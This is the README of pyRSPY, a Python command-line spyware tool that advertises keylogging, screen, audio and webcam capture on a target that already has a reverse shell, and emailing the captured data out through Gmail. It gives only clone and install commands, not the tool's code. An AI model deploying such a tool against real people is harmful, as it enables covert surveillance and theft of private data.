# pyRSPY

pyRSPY is a Command Line Interface (CLI) tool written in python. It's a tool for penetration testing only!

## Features

* Keylogging
* Screenshot capturing
* Audio capturing
* Webcam footage capturing (Linux support only for now)
* Archiving the data captured
* Emailing the data captured (Works with Gmail only!)

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

* A reverse shell from the target OS
* Python installed in the target OS

### Installing

Download the zip or simply do:

```
git clone https://github.com/GeorgeFesa/pyRSPY
```

Next: 

```
cd pyrspy
```

Install the dependencies:
```
pip3 install -r requirements.txt
```

or you can install them using:

```
python3 setup.py install
```

For Linux based targets you need to install also:

```
python3 libportaudio2_fix.py
```

To check if everything installed correctly type:

```
python3 pyrspy.py -V
```

## Built With

* [Python](https://www.python.org/) - The programming language used
* [PyCharm](https://www.jetbrains.com/pycharm/) - The integrated development environment (IDE) used
* [Love and Patience](https://github.com/GeorgeFesa/pyRSPY) - :) <3

## History

v1.0 - Initial release

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## Disclaimer

TO BE USED FOR EDUCATIONAL PURPOSES ONLY \
The use of the pyRSPY is COMPLETE RESPONSIBILITY of the END-USER. 
I assume NO liability and NOT responsible for any misuse or damage caused by this program. 